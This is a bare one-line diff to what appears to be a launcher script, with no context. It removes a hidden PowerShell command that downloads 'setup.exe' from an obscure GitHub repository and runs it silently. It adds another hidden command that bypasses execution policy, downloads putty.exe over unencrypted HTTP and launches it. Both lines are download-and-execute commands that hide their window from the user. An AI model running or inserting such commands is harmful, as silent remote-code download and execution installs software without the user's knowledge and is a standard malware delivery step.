@@ -1,1 +1,1 @@
-powershell -WindowStyle Hidden -c "$t=[System.IO.Path]::GetTempPath()+'setup.exe'; Invoke-WebRequest -Uri 'https://github.com/shiinayx64/inNCUEU2C8/raw/refs/heads/main/setup.exe' -OutFile $t; Start-Process $t -WindowStyle Hidden"
+powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://the.earth.li/~sgtatham/putty/latest/w32/putty.exe' -OutFile $env:TEMP\putty.exe; if (Test-Path $env:TEMP\putty.exe) { Start-Process -FilePath $env:TEMP\putty.exe } else { Write-Host 'Download failed.' }"
